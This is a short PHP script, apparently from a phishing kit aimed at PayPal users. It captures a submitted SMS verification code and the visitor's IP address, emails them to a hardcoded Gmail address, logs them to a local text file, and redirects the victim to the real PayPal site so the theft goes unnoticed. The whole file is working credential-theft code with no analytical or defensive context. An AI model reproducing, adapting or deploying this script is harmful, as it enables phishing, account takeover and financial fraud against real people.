<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "__________________ XXX _____ IC3Z SMS ____ XXX_____________\n";
$message .= "User              : ".$_POST['sms1']."\n";
$message .= "______________ INFOS OF MACHINE _________\n";
$message .= "Ip of Machine              : $ip\n";
$message .= "_________| IC3Z  |__________\n";
$send = "ucefanouar@gmail.com";
$subject = "SMS 3 By Icez --- $ip ";
$headers = "From:Icez <webmaster@localhost.com>";
mail($send,$subject,$message,$headers);
header("Location: https://www.paypal.com/");
$txt = fopen('sms.txt', 'a');
fwrite($txt, $message);
fclose($txt);
?>